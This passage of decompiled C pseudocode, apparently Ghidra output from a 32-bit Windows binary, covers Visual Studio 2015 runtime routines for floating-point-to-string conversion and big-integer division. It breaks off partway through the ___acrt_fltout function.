  int *piVar1;
  char *pcVar2;
  char cVar3;
  char *pcVar4;
  int iVar5;
  
  if ((param_1 != (char *)0x0) && (param_2 != 0)) {
    *param_1 = '\0';
    iVar5 = param_3;
    if (param_3 < 1) {
      iVar5 = 0;
    }
    if (param_2 <= iVar5 + 1U) {
      piVar1 = __errno();
      iVar5 = 0x22;
      goto LAB_0040e0dc;
    }
    if (param_4 != 0) {
      pcVar2 = param_1 + 1;
      pcVar4 = *(char **)(param_4 + 8);
      *param_1 = '0';
      if (0 < param_3) {
        do {
          cVar3 = *pcVar4;
          if (cVar3 == '\0') {
            cVar3 = '0';
          }
          else {
            pcVar4 = pcVar4 + 1;
          }
          *pcVar2 = cVar3;
          pcVar2 = pcVar2 + 1;
          param_3 = param_3 + -1;
        } while (0 < param_3);
      }
      *pcVar2 = '\0';
      if ((-1 < param_3) && ('4' < *pcVar4)) {
        while (pcVar2 = pcVar2 + -1, *pcVar2 == '9') {
          *pcVar2 = '0';
        }
        *pcVar2 = *pcVar2 + '\x01';
      }
      if (*param_1 == '1') {
        *(int *)(param_4 + 4) = *(int *)(param_4 + 4) + 1;
      }
      else {
        pcVar2 = param_1 + 1;
        do {
          cVar3 = *pcVar2;
          pcVar2 = pcVar2 + 1;
        } while (cVar3 != '\0');
        FID_conflict__memcpy(param_1,param_1 + 1,(size_t)(pcVar2 + (1 - (int)(param_1 + 2))));
      }
      return 0;
    }
  }
  piVar1 = __errno();
  iVar5 = 0x16;
LAB_0040e0dc:
  *piVar1 = iVar5;
  FUN_004091be();
  return iVar5;
}



// Library Function - Single Match
//  public: __thiscall `anonymous namespace'::scoped_fp_state_reset::scoped_fp_state_reset(void)
// 
// Library: Visual Studio 2015 Release

scoped_fp_state_reset * __thiscall
`anonymous_namespace'::scoped_fp_state_reset::scoped_fp_state_reset(scoped_fp_state_reset *this)

{
  _fegetenv((uint *)this);
  if (((byte)*(undefined4 *)this & 0x1f) == 0x1f) {
    this[8] = (scoped_fp_state_reset)0x0;
  }
  else {
    _feholdexcept((uint *)this);
    this[8] = (scoped_fp_state_reset)0x1;
  }
  return this;
}



// WARNING: Removing unreachable block (ram,0x0040e517)
// WARNING: Removing unreachable block (ram,0x0040e4f2)
// WARNING: Could not reconcile some variable overlaps
// Library Function - Single Match
//  unsigned __int64 __cdecl __crt_strtox::divide(struct __crt_strtox::big_integer &,struct
// __crt_strtox::big_integer const &)
// 
// Library: Visual Studio 2015 Release

__uint64 __cdecl __crt_strtox::divide(big_integer *param_1,big_integer *param_2)

{
  int iVar1;
  uint *puVar2;
  uint uVar3;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint uVar4;
  undefined4 *puVar5;
  uint uVar6;
  uint *puVar7;
  int *piVar8;
  uint uVar9;
  int *piVar10;
  uint uVar11;
  undefined4 uVar12;
  bool bVar13;
  undefined8 uVar14;
  longlong lVar15;
  ulonglong uVar16;
  ulonglong uVar17;
  ulonglong uVar18;
  undefined local_21c [460];
  uint *puStack80;
  undefined4 uStack76;
  undefined8 uStack72;
  int iStack64;
  uint local_3c;
  uint uStack56;
  uint uStack52;
  uint local_2c;
  int iStack40;
  uint local_24;
  int local_20;
  int iStack28;
  uint uStack24;
  uint *local_14;
  uint local_10;
  uint local_c;
  uint local_8;
  
  iVar1 = *(int *)param_1;
  if (iVar1 == 0) {
    return 0;
  }
  local_3c = *(uint *)param_2;
  if (local_3c == 0) {
    return 0;
  }
  local_10 = iVar1 - 1;
  uVar9 = local_3c - 1;
  if (uVar9 == 0) {
    local_2c = *(uint *)(param_2 + 4);
    if (local_2c == 1) {
      uVar9 = *(uint *)(param_1 + 4);
      *(undefined4 *)param_1 = 0;
      _memcpy_s(param_1 + 4,0x1cc,local_21c,0);
      return (__uint64)uVar9;
    }
    if (local_10 == 0) {
      uVar9 = *(uint *)(param_1 + 4);
      *(undefined4 *)param_1 = 0;
      _memcpy_s(param_1 + 4,0x1cc,local_21c,0);
      uVar6 = uVar9 % local_2c;
      *(uint *)(param_1 + 4) = uVar6;
      *(uint *)param_1 = (uint)(uVar6 != 0);
      return (ulonglong)uVar9 / (ulonglong)local_2c;
    }
    uVar9 = 0;
    local_c = 0;
    local_8 = 0;
    local_14 = (uint *)0x0;
    if (local_10 != 0xffffffff) {
      puVar7 = (uint *)(param_1 + iVar1 * 4);
      local_20 = iVar1;
      do {
        uVar14 = __aulldvrm(*puVar7,uVar9,local_2c,0);
        uStack72._4_4_ = (int)((ulonglong)uVar14 >> 0x20);
        puVar7 = puVar7 + -1;
        local_14 = (uint *)param_1;
        local_8 = local_c;
        local_20 = local_20 + -1;
        uVar9 = extraout_ECX;
        local_c = (int)uVar14;
      } while (local_20 != 0);
    }
    *(undefined4 *)param_1 = 0;
    _memcpy_s(param_1 + 4,0x1cc,local_21c,0);
    *(uint *)(param_1 + 4) = uVar9;
    *(uint **)(param_1 + 8) = local_14;
    *(uint *)param_1 = (local_14 != (uint *)0x0) + 1;
    return CONCAT44(local_8,local_c);
  }
  if (uVar9 <= local_10) {
    local_20 = local_10 - uVar9;
    if (local_20 <= (int)local_10) {
      piVar8 = (int *)(param_1 + iVar1 * 4);
      piVar10 = (int *)(param_2 + (local_10 - local_20) * 4 + 4);
      uVar9 = local_10;
      do {
        if (*piVar10 != *piVar8) {
          if (*(uint *)(param_1 + uVar9 * 4 + 4) <= *(uint *)(param_2 + (uVar9 - local_20) * 4 + 4))
          goto LAB_0040e366;
          break;
        }
        uVar9 = uVar9 - 1;
        piVar10 = piVar10 + -1;
        piVar8 = piVar8 + -1;
      } while (local_20 <= (int)uVar9);
    }
    local_20 = local_20 + 1;
LAB_0040e366:
    if (local_20 != 0) {
      uStack56 = *(uint *)(param_2 + local_3c * 4);
      local_24 = *(uint *)(param_2 + local_3c * 4 + -4);
      iStack40 = 0x1f;
      if (uStack56 != 0) {
        for (; uStack56 >> iStack40 == 0; iStack40 = iStack40 + -1) {
        }
      }
      if (uStack56 == 0) {
        iStack40 = 0x20;
      }
      else {
        iStack40 = 0x1f - iStack40;
      }
      iStack64 = 0x20 - iStack40;
      if (iStack40 != 0) {
        uVar9 = local_24 >> ((byte)iStack64 & 0x1f);
        local_24 = local_24 << ((byte)iStack40 & 0x1f);
        uStack56 = uStack56 << ((byte)iStack40 & 0x1f) | uVar9;
        if (2 < local_3c) {
          local_24 = local_24 | *(uint *)(param_2 + local_3c * 4 + -8) >> ((byte)iStack64 & 0x1f);
        }
      }
      uStack76 = 0;
      local_20 = local_20 + -1;
      if (local_20 < 0) {
        uVar12 = 0;
        uStack76 = 0;
      }
      else {
        local_14 = (uint *)(param_1 + local_20 * 4 + 4);
        local_c = local_20 + local_3c;
        puStack80 = (uint *)(param_1 + local_c * 4 + -4);
        uVar12 = uStack76;
        do {
          uStack76 = uVar12;
          if (local_10 < local_c) {
            uStack52 = 0;
          }
          else {
            uStack52 = puStack80[2];
          }
          uVar9 = puStack80[1];
          uStack24 = *puStack80;
          local_2c = 0;
          local_8 = uStack52;
          if (iStack40 != 0) {
            uVar9 = uStack24 >> ((byte)iStack64 & 0x1f);
            lVar15 = __allshl((byte)iStack40,uStack52);
            local_8 = (uint)((ulonglong)lVar15 >> 0x20);
            uVar9 = uVar9 | (uint)lVar15;
            uStack24 = uStack24 << ((byte)iStack40 & 0x1f);
            if (2 < local_c) {
              uStack24 = uStack24 |
                         *(uint *)(param_1 + (local_3c + local_20) * 4 + -8) >>
                         ((byte)iStack64 & 0x1f);
            }
          }
          uVar16 = __aulldvrm(uVar9,local_8,uStack56,0);
          local_2c = 0;
          uVar18 = (ulonglong)extraout_ECX_00;
          uStack72 = uVar16;
          if ((int)(uVar16 >> 0x20) != 0) {
            uVar17 = __allmul((uint)(uVar16 - 0xffffffff),(uint)(uVar16 - 0xffffffff >> 0x20),
                              uStack56,0);
            iStack28 = (int)(uVar16 >> 0x20);
            local_8 = (uint)uVar16;
            uVar18 = uVar17 + uVar18;
            local_2c = (uint)(uVar18 >> 0x20);
            uStack72 = 0xffffffff;
          }
          iStack28 = (int)(uStack72 >> 0x20);
          uVar9 = (uint)uVar18;
          uVar16 = uStack72;
          if ((int)(uVar18 >> 0x20) == 0) {
            do {
              uVar6 = (uint)uStack72;
              local_8 = uStack24;
              uVar18 = __allmul(local_24,0,uVar6,(uint)(uStack72 >> 0x20));
              if (uVar18 <= CONCAT44(uVar9,local_8)) break;
              bVar13 = uVar6 != 0;
              uVar6 = uVar6 - 1;
              iStack28 = iStack28 + -1 + (uint)bVar13;
              uStack72 = CONCAT44(iStack28,uVar6);
              bVar13 = CARRY4(uVar9,uStack56);
              uVar9 = uVar9 + uStack56;
              local_2c = local_2c + bVar13;
            } while (local_2c == 0);
            uVar16 = CONCAT44(iStack28,uVar6);
          }
          uStack72._4_4_ = (int)(uStack72 >> 0x20);
          if (uVar16 != 0) {
            uVar6 = 0;
            uVar9 = 0;
            if (local_3c != 0) {
              puVar2 = (uint *)(param_2 + 4);
              local_10 = local_3c;
              puVar7 = local_14;
              do {
                lVar15 = (uStack72 & 0xffffffff) * (ulonglong)*puVar2;
                uVar3 = (uint)lVar15;
                uVar11 = uVar6 + uVar3;
                uVar6 = uVar9 + (int)((ulonglong)lVar15 >> 0x20) + uStack72._4_4_ * *puVar2 +
                        (uint)CARRY4(uVar6,uVar3);
                uVar9 = 0;
                if (*puVar7 < uVar11) {
                  bVar13 = 0xfffffffe < uVar6;
                  uVar6 = uVar6 + 1;
                  uVar9 = (uint)bVar13;
                }
                *puVar7 = *puVar7 - uVar11;
                puVar7 = puVar7 + 1;
                puVar2 = puVar2 + 1;
                local_10 = local_10 - 1;
              } while (local_10 != 0);
            }
            if ((uVar9 != 0) || (uStack52 < uVar6)) {
              if (local_3c != 0) {
                uVar6 = 0;
                puVar2 = local_14;
                uVar9 = local_3c;
                puVar7 = (uint *)param_2;
                do {
                  puVar7 = puVar7 + 1;
                  uVar3 = *puVar2;
                  uVar11 = *puVar7;
                  uVar4 = uVar3 + *puVar7;
                  *puVar2 = uVar4 + uVar6;
                  uVar6 = (uint)CARRY4(uVar3,uVar11) + (uint)CARRY4(uVar4,uVar6);
                  uVar9 = uVar9 - 1;
                  puVar2 = puVar2 + 1;
                } while (uVar9 != 0);
              }
              uVar16 = uVar16 - 1;
            }
            local_10 = local_c - 1;
          }
          iStack28 = (int)(uVar16 >> 0x20);
          uVar12 = (undefined4)uVar16;
          local_14 = local_14 + -1;
          local_20 = local_20 + -1;
          puStack80 = puStack80 + -1;
          local_c = local_c - 1;
        } while (-1 < local_20);
      }
      uVar9 = local_10 + 1;
      if (uVar9 < *(uint *)param_1) {
        puVar5 = (undefined4 *)(param_1 + (local_10 + 2) * 4);
        uVar6 = uVar9;
        do {
          *puVar5 = 0;
          puVar5 = puVar5 + 1;
          uVar6 = uVar6 + 1;
        } while (uVar6 < *(uint *)param_1);
      }
      *(uint *)param_1 = uVar9;
      while ((uVar9 != 0 && (*(int *)(param_1 + *(int *)param_1 * 4) == 0))) {
        uVar9 = *(int *)param_1 - 1;
        *(uint *)param_1 = uVar9;
      }
      return CONCAT44(uStack76,uVar12);
    }
  }
  return 0;
}



// WARNING: Could not reconcile some variable overlaps
// Library Function - Single Match
//  ___acrt_fltout
// 
// Library: Visual Studio 2015 Release

void __cdecl
___acrt_fltout(uint param_1,uint param_2,int param_3,int *param_4,char *param_5,rsize_t param_6)

{
  uint *puVar1;
  ulonglong uVar2;
  code *pcVar3;
  bool bVar4;
  int *piVar5;
  char cVar6;
  __acrt_fp_class _Var7;
  rsize_t rVar8;
  errno_t eVar9;
  uint uVar10;
  uint uVar11;
  uint *puVar12;
  byte bVar13;
  byte extraout_DL;
  byte extraout_DL_00;
  undefined4 extraout_EDX;
  uint extraout_EDX_00;
  uint **ppuVar14;
  int iVar15;
  uint **ppuVar16;
  uint **ppuVar17;
  uint **ppuVar18;
  uint *puVar19;
  char *pcVar20;
  uint uVar21;
  uint **ppuVar22;
  uint uVar23;
  float10 extraout_ST0;
  undefined8 uVar24;
  longlong lVar25;
  __uint64 _Var26;
  ulonglong uVar27;
  char *pcVar29;
  double dVar28;
  undefined uVar30;
  undefined4 in_stack_fffff698;
  uint *apuStack2404 [115];
  uint local_798 [2];
  char local_790;
  int local_788;
  int *local_784;
  char *local_780;
  char *local_77c;
  uint uStack1912;
  uint **local_774;
  uint local_770;
  undefined8 local_76c;
  uint **ppuStack1892;
  uint **local_760;
  uint **ppuStack1884;
  uint **ppuStack1880;
  uint **local_754;
  uint **local_750;
  undefined uStack1865;
  uint **ppuStack1864;
  uint *apuStack1860 [115];
  uint **local_578;
  uint *local_574 [115];
  uint **ppuStack936;
  uint *apuStack932 [115];
  uint **local_1d8;
  uint *local_1d4 [115];
  uint local_8;
  
  pcVar20 = param_5;
  piVar5 = param_4;
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  local_784 = param_4;
  local_780 = param_5;
  `anonymous_namespace'::scoped_fp_state_reset::scoped_fp_state_reset
            ((scoped_fp_state_reset *)local_798);
  uVar10 = param_2;
  uVar11 = param_1;
  uVar30 = (undefined)in_stack_fffff698;
  cVar6 = '-';
  if ((param_2 & 0x80000000) == 0) {
    cVar6 = ' ';
  }
  *piVar5 = (int)cVar6;
  piVar5[2] = (int)pcVar20;
  if (((param_2 & 0x7ff00000) == 0) && ((param_1 | param_2 & 0xfffff) == 0)) {
    pcVar29 = "0";
    local_784[1] = 0;
  }
  else {
    _Var7 = __acrt_fp_classify((double *)&param_1);
    uVar30 = (undefined)in_stack_fffff698;
    if (_Var7 != 0) {
      local_784[1] = 1;
    }
    if (_Var7 == 1) {
      pcVar29 = "1#INF";
    }
    else if (_Var7 == 2) {
      pcVar29 = "1#QNAN";
    }
    else if (_Var7 == 3) {
      pcVar29 = "1#SNAN";
    }
    else {
      if (_Var7 != 4) {
        param_2 = uVar10 & 0x7fffffff;
        local_788 = 0;
        local_77c = (char *)(param_3 + 1);
        local_76c = CONCAT44(uVar10,uVar11) & 0x7fffffffffffffff;
        local_76c._4_4_ = (uint)(local_76c >> 0x20);
        uVar10 = local_76c._4_4_ >> 0x14;
        if (uVar10 != 0) {
          iVar15 = 0x100000;
          uVar23 = 0;
        }
        else {
          iVar15 = 0;
          uVar23 = uVar10;
        }
        uVar21 = (local_76c._4_4_ & 0xfffff) + iVar15 + (uint)CARRY4((uint)local_76c,uVar23);
        ppuVar16 = (uint **)(uVar10 + ((uVar10 == 0) - 0x433));
        param_1 = uVar11;
        local_750 = ppuVar16;
        FUN_004108e0();
        dVar28 = (double)extraout_ST0;
        FUN_004109f0(dVar28);
        uVar24 = FUN_00412b90((int)((ulonglong)dVar28 >> 0x20),extraout_EDX);
        local_770 = (uint)uVar24;
        if ((local_770 == 0x7fffffff) || (local_770 == 0x80000000)) {
          local_770 = 0;
        }
        local_1d4[0] = (uint *)((uint)local_76c + uVar23);
        local_1d4[1] = (uint *)uVar21;
        uVar11 = (uint)(uVar21 != 0);
        ppuVar14 = (uint **)(uVar11 + 1);
        local_1d8 = ppuVar14;
        if ((int)ppuVar16 < 0) {
          if (ppuVar16 == (uint **)0xfffffc02) {
LAB_0040ed00:
            puVar19 = local_1d4[uVar11];
            local_76c = local_76c & 0xffffffff;
            iVar15 = 0x1f;
            if (puVar19 != (uint *)0x0) {
              for (; (uint)puVar19 >> iVar15 == 0; iVar15 = iVar15 + -1) {
              }
            }
            if (puVar19 == (uint *)0x0) {
              iVar15 = 0;
            }
            else {
              iVar15 = iVar15 + 1;
            }
            uStack1865 = iVar15 == 0x20;
            if ((ppuVar14 == (uint **)0x73) && ((bool)uStack1865)) {
              bVar4 = true;
            }
            else {
              bVar4 = false;
            }
            if (((uint **)0x73 < ppuVar14) || (bVar4)) {
              local_578 = (uint **)0x0;
              local_1d8 = (uint **)0x0;
              _memcpy_s(local_1d4,0x1cc,local_574,0);
            }
            else {
              ppuVar17 = (uint **)0x72;
              if (ppuVar14 < (uint **)0x72) {
                ppuVar17 = ppuVar14;
              }
              if (ppuVar17 != (uint **)0xffffffff) {
                ppuVar22 = local_1d4 + (int)ppuVar17;
                ppuVar18 = ppuVar17;
                ppuStack1880 = ppuVar22;
                do {
                  if (ppuVar18 < ppuVar14) {
                    local_754 = (uint **)*ppuVar22;
                  }
                  else {
                    local_754 = (uint **)0x0;
                  }
                  if ((uint **)((int)ppuVar18 + -1) < ppuVar14) {
                    puVar19 = ppuVar22[-1];
                  }
                  else {
                    puVar19 = (uint *)0x0;
                  }
                  ppuVar22 = ppuVar22 + -1;
                  ppuVar18 = (uint **)((int)ppuVar18 + -1);
                  *ppuStack1880 = (uint *)((uint)puVar19 >> 0x1f ^ (int)local_754 * 2);
                  ppuStack1880 = ppuStack1880 + -1;
                  ppuVar14 = local_1d8;
                  ppuVar16 = local_750;
                } while (ppuVar18 != (uint **)0xffffffff);
              }
              local_1d8 = ppuVar17;
              if ((bool)uStack1865) {
                local_1d8 = (uint **)((int)ppuVar17 + 1);
              }
            }
            uVar11 = 1U - (int)ppuVar16 >> 5;
            _memset(local_574,0,uVar11 * 4);
            local_574[uVar11] = (uint *)(1 << ((byte)(1U - (int)ppuVar16) & 0x1f));
          }
          else {
            local_574[0] = (uint *)0x0;
            ppuVar17 = (uint **)0x2;
            local_574[1] = (uint *)0x100000;
            local_578 = (uint **)0x2;
            if (ppuVar14 != (uint **)0x2) goto LAB_0040ed00;
            iVar15 = 0;
            do {
              if (*(int *)((int)local_574 + iVar15) != *(int *)((int)local_1d4 + iVar15))
              goto LAB_0040ed00;
              iVar15 = iVar15 + 4;
            } while (iVar15 != 8);
            local_76c = local_76c & 0xffffffff;
            iVar15 = 0x1f;
            if (uVar21 != 0) {
              for (; uVar21 >> iVar15 == 0; iVar15 = iVar15 + -1) {
              }
            }
            if (uVar21 == 0) {
              iVar15 = 0;
            }
            else {
              iVar15 = iVar15 + 1;
            }
            uStack1865 = 0x20U - iVar15 < 2;
            ppuVar16 = local_1d4 + 2;
            ppuStack1880 = ppuVar16;
            do {
              if (ppuVar17 < ppuVar14) {
                local_754 = (uint **)*ppuVar16;
              }
              else {
                local_754 = (uint **)0x0;
              }
              if ((uint **)((int)ppuVar17 + -1) < ppuVar14) {
                puVar19 = ppuVar16[-1];
              }
              else {
                puVar19 = (uint *)0x0;
              }
              ppuVar16 = ppuVar16 + -1;
              ppuVar17 = (uint **)((int)ppuVar17 + -1);
              *ppuStack1880 = (uint *)((uint)puVar19 >> 0x1e ^ (int)local_754 << 2);
              ppuStack1880 = ppuStack1880 + -1;
              ppuVar14 = local_1d8;
            } while (ppuVar17 != (uint **)0xffffffff);
            local_1d8 = (uint **)((byte)uStack1865 + 2);
            ppuStack1884 = (uint **)(2 - (int)local_750);
            uVar11 = (uint)ppuStack1884 >> 5;
            _memset(local_574,0,uVar11 * 4);
            local_574[uVar11] = (uint *)(1 << ((byte)ppuStack1884 & 0x1f));
          }
          local_578 = (uint **)(uVar11 + 1);
          ppuStack936 = local_578;
          _memcpy_s(apuStack932,0x1cc,local_574,(int)local_578 * 4);
        }
        else {
          local_574[0] = (uint *)0x0;
          local_574[1] = (uint *)0x100000;
          local_578 = (uint **)0x2;
          if (ppuVar14 == (uint **)0x2) {
            iVar15 = 0;
            do {
              if (*(int *)((int)local_574 + iVar15) != *(int *)((int)local_1d4 + iVar15))
              goto LAB_0040ea10;
              iVar15 = iVar15 + 4;
            } while (iVar15 != 8);
            local_760 = (uint **)((int)local_750 + 2U & 0x1f);
            local_774 = (uint **)(0x20 - (int)local_760);
            ppuVar16 = (uint **)((int)local_750 + 2U >> 5);
            local_754 = ppuVar16;
            lVar25 = __allshl((byte)local_774,0);
            local_76c = local_76c & 0xffffffff;
            ppuStack1884 = (uint **)((int)lVar25 + -1);
            iVar15 = 0x1f;
            if (uVar21 != 0) {
              for (; uVar21 >> iVar15 == 0; iVar15 = iVar15 + -1) {
              }
            }
            uStack1912 = ~(uint)ppuStack1884;
            if (uVar21 == 0) {
              iVar15 = 0;
            }
            else {
              iVar15 = iVar15 + 1;
            }
            ppuStack1880 = (uint **)((int)ppuVar16 + 2);
            uStack1865 = (uint **)(0x20 - iVar15) < local_760;
            if ((ppuStack1880 == (uint **)0x73) && ((uint **)(0x20 - iVar15) < local_760)) {
              bVar4 = true;
            }
            else {
              bVar4 = false;
            }
            if ((0x73 < ppuStack1880) || (bVar4)) {
              local_578 = (uint **)0x0;
              local_1d8 = (uint **)0x0;
              _memcpy_s(local_1d4,0x1cc,local_574,0);
            }
            else {
              if (0x71 < ppuStack1880) {
                ppuStack1880 = (uint **)0x72;
              }
              ppuStack1892 = ppuStack1880;
              if (ppuStack1880 != (uint **)0xffffffff) {
                ppuVar17 = (uint **)((int)ppuStack1880 - (int)local_754);
                local_750 = local_1d4 + (int)ppuVar17;
                do {
                  ppuVar16 = local_754;
                  if (ppuStack1892 < local_754) break;
                  if (ppuVar17 < ppuVar14) {
                    puVar19 = *local_750;
                  }
                  else {
                    puVar19 = (uint *)0x0;
                  }
                  if ((uint **)((int)ppuVar17 + -1) < ppuVar14) {
                    puVar12 = local_750[-1];
                  }
                  else {
                    puVar12 = (uint *)0x0;
                  }
                  local_1d4[(int)ppuStack1892] =
                       (uint *)(((uint)puVar12 & uStack1912) >> ((byte)local_774 & 0x1f) |
                               ((uint)puVar19 & (uint)ppuStack1884) << ((byte)local_760 & 0x1f));
                  ppuStack1892 = (uint **)((int)ppuStack1892 + -1);
                  ppuVar17 = (uint **)((int)ppuVar17 + -1);
                  local_750 = local_750 + -1;
                  ppuVar14 = local_1d8;
                } while (ppuStack1892 != (uint **)0xffffffff);
              }
              if (ppuVar16 != (uint **)0x0) {
                ppuVar14 = local_1d4;
                for (; ppuVar16 != (uint **)0x0; ppuVar16 = (uint **)((int)ppuVar16 + -1)) {
                  *ppuVar14 = (uint *)0x0;
                  ppuVar14 = ppuVar14 + 1;
                }
              }
              local_1d8 = ppuStack1880;
              if ((bool)uStack1865) {
                local_1d8 = (uint **)((int)ppuStack1880 + 1);
              }
            }
            local_574[0] = (uint *)&DAT_00000004;
          }
          else {
LAB_0040ea10:
            local_754 = (uint **)((int)local_750 + 1U & 0x1f);
            local_774 = (uint **)(0x20 - (int)local_754);
            ppuVar16 = (uint **)((int)local_750 + 1U >> 5);
            local_750 = ppuVar16;
            lVar25 = __allshl((byte)local_774,0);
            puVar19 = local_1d4[uVar11];
            ppuStack1884 = (uint **)((int)lVar25 + -1);
            local_76c = local_76c & 0xffffffff;
            iVar15 = 0x1f;
            if (puVar19 != (uint *)0x0) {
              for (; (uint)puVar19 >> iVar15 == 0; iVar15 = iVar15 + -1) {
              }
            }
            uStack1912 = ~(uint)ppuStack1884;
            if (puVar19 == (uint *)0x0) {
              iVar15 = 0;
            }
            else {
              iVar15 = iVar15 + 1;
            }
            ppuStack1892 = (uint **)((int)ppuVar14 + (int)ppuVar16);
            uStack1865 = (uint **)(0x20 - iVar15) < local_754;
            if ((ppuStack1892 == (uint **)0x73) && ((uint **)(0x20 - iVar15) < local_754)) {
              bVar4 = true;
            }
            else {
              bVar4 = false;
            }
            if (((uint **)0x73 < ppuStack1892) || (bVar4)) {
              local_578 = (uint **)0x0;
              local_1d8 = (uint **)0x0;
              _memcpy_s(local_1d4,0x1cc,local_574,0);
            }
            else {
              if ((uint **)0x71 < ppuStack1892) {
                ppuStack1892 = (uint **)0x72;
              }
              ppuStack1880 = ppuStack1892;
              if (ppuStack1892 != (uint **)0xffffffff) {
                ppuVar17 = (uint **)((int)ppuStack1892 - (int)local_750);
                local_760 = local_1d4 + (int)ppuVar17;
                do {
                  ppuVar16 = local_750;
                  if (ppuStack1880 < local_750) break;
                  if (ppuVar17 < ppuVar14) {
                    puVar19 = *local_760;
                  }
                  else {
                    puVar19 = (uint *)0x0;
                  }
                  if ((uint **)((int)ppuVar17 + -1) < ppuVar14) {
                    puVar12 = local_760[-1];
                  }
                  else {
                    puVar12 = (uint *)0x0;
                  }
                  local_760 = local_760 + -1;
                  local_1d4[(int)ppuStack1880] =
                       (uint *)(((uint)puVar19 & (uint)ppuStack1884) << ((byte)local_754 & 0x1f) |
                               ((uint)puVar12 & uStack1912) >> ((byte)local_774 & 0x1f));
                  ppuStack1880 = (uint **)((int)ppuStack1880 + -1);
                  ppuVar17 = (uint **)((int)ppuVar17 + -1);
                  ppuVar14 = local_1d8;
                } while (ppuStack1880 != (uint **)0xffffffff);
              }
              if (ppuVar16 != (uint **)0x0) {
                ppuVar14 = local_1d4;
                for (; ppuVar16 != (uint **)0x0; ppuVar16 = (uint **)((int)ppuVar16 + -1)) {
                  *ppuVar14 = (uint *)0x0;
                  ppuVar14 = ppuVar14 + 1;
                }
              }
              local_1d8 = ppuStack1892;
              if ((bool)uStack1865) {
                local_1d8 = (uint **)((int)ppuStack1892 + 1);
              }
            }
            local_574[0] = (uint *)0x2;
          }
          ppuStack936 = (uint **)0x1;
          local_574[1] = (uint *)0x0;
          local_578 = (uint **)0x1;
          _memcpy_s(apuStack932,0x1cc,local_574,4);
        }
        uStack1912 = 10;
        if ((int)local_770 < 0) {
          ppuStack1884 = (uint **)(-local_770 % 10);
          for (ppuStack1880 = (uint **)(-local_770 / 10); ppuStack1880 != (uint **)0x0;
              ppuStack1880 = (uint **)((int)ppuStack1880 - (int)local_750)) {
            local_750 = ppuStack1880;
            if ((uint **)0x26 < ppuStack1880) {
              local_750 = (uint **)0x26;
            }
            uVar11 = (uint)(byte)(&DAT_004189b6)[(int)local_750 * 4];
            bVar13 = (&DAT_004189b7)[(int)local_750 * 4];
            local_578 = (uint **)(uVar11 + bVar13);
            _memset(local_574,0,uVar11 * 4);
            FID_conflict__memcpy
                      (local_574 + uVar11,
                       &DAT_004180b0 + (uint)*(ushort *)(&DAT_004189b4 + (int)local_750 * 4) * 4,
                       (uint)bVar13 << 2);
            puVar19 = local_1d4[0];
            ppuStack1892 = local_578;
            if (local_578 < (uint **)0x2) {
              if (local_574[0] == (uint *)0x0) {
LAB_0040f389:
                in_stack_fffff698 = 0;
                local_1d8 = (uint **)0x0;
                rVar8 = 0;
                ppuVar16 = apuStack2404;
                goto LAB_0040f615;
              }
              if ((local_574[0] == (uint *)0x1) || (local_1d8 == (uint **)0x0)) goto LAB_0040f626;
              puVar12 = (uint *)0x0;
              local_76c = local_76c & 0xffffffff | ZEXT48(local_1d8) << 0x20;
              ppuVar16 = (uint **)0x0;
              do {
                puVar19 = local_1d4[(int)ppuVar16];
                uVar11 = (uint)(ZEXT48(local_574[0]) * ZEXT48(puVar19));
                local_1d4[(int)ppuVar16] = (uint *)(uVar11 + (int)puVar12);
                puVar12 = (uint *)((int)(ZEXT48(local_574[0]) * ZEXT48(puVar19) >> 0x20) +
                                  (uint)CARRY4(uVar11,(uint)puVar12));
                ppuVar16 = (uint **)((int)ppuVar16 + 1);
              } while (ppuVar16 != local_1d8);
LAB_0040f3e9:
              if (puVar12 == (uint *)0x0) goto LAB_0040f626;
              if (local_1d8 < (uint **)0x73) {
                local_1d4[(int)local_1d8] = puVar12;
                local_1d8 = (uint **)((int)local_1d8 + 1);
                goto LAB_0040f626;
              }
LAB_0040f6c4:
              in_stack_fffff698 = 0;
              local_1d8 = (uint **)0x0;
              _memcpy_s(local_1d4,0x1cc,apuStack2404,0);
              bVar4 = false;
            }
            else {
              if (local_1d8 < (uint **)0x2) {
                local_1d8 = local_578;
                _memcpy_s(local_1d4,0x1cc,local_574,(int)local_578 << 2);
                if (puVar19 != (uint *)0x0) {
                  if ((puVar19 != (uint *)0x1) && (local_1d8 != (uint **)0x0)) {
                    puVar12 = (uint *)0x0;
                    local_76c = local_76c & 0xffffffff | ZEXT48(local_1d8) << 0x20;
                    ppuVar16 = (uint **)0x0;
                    do {
                      puVar1 = local_1d4[(int)ppuVar16];
                      uVar11 = (uint)(ZEXT48(puVar19) * ZEXT48(puVar1));
                      local_1d4[(int)ppuVar16] = (uint *)(uVar11 + (int)puVar12);
                      puVar12 = (uint *)((int)(ZEXT48(puVar19) * ZEXT48(puVar1) >> 0x20) +
                                        (uint)CARRY4(uVar11,(uint)puVar12));
                      ppuVar16 = (uint **)((int)ppuVar16 + 1);
                    } while (ppuVar16 != local_1d8);
                    goto LAB_0040f3e9;
                  }
                  goto LAB_0040f626;
                }
                goto LAB_0040f389;
              }
              ppuVar16 = local_574;
              if (local_578 < local_1d8) {
                local_774 = local_1d4;
                ppuStack1892 = local_1d8;
                local_754 = local_578;
              }
              else {
                ppuVar16 = local_1d4;
                local_774 = local_574;
                local_754 = local_1d8;
              }
              local_1d8 = (uint **)0x0;
              ppuVar14 = (uint **)0x0;
              ppuStack1864 = (uint **)0x0;
              if (local_754 != (uint **)0x0) {
                local_788 = (int)ppuVar16 - (int)apuStack1860;
                do {
                  uVar11 = *(uint *)((int)apuStack1860 + local_788 + (int)ppuVar14 * 4);
                  local_76c = local_76c & 0xffffffff | (ulonglong)uVar11 << 0x20;
                  if (uVar11 == 0) {
                    if (ppuVar14 == local_1d8) {
                      apuStack1860[(int)ppuVar14] = (uint *)0x0;
                      local_1d8 = (uint **)((int)ppuVar14 + 1);
                      ppuStack1864 = local_1d8;
                    }
                  }
                  else {
                    uVar10 = 0;
                    local_760 = (uint **)0x0;
                    ppuVar16 = ppuVar14;
                    if (ppuStack1892 != (uint **)0x0) {
                      do {
                        if (ppuVar16 == (uint **)0x73) break;
                        if (ppuVar16 == local_1d8) {
                          apuStack1860[(int)ppuVar16] = (uint *)0x0;
                          ppuStack1864 = (uint **)((int)local_760 + 1U + (int)ppuVar14);
                        }
                        lVar25 = ZEXT48(local_774[(int)local_760]) * (ulonglong)uVar11;
                        uVar23 = (uint)lVar25;
                        uVar21 = uVar23 + uVar10;
                        ppuVar17 = apuStack1860 + (int)ppuVar16;
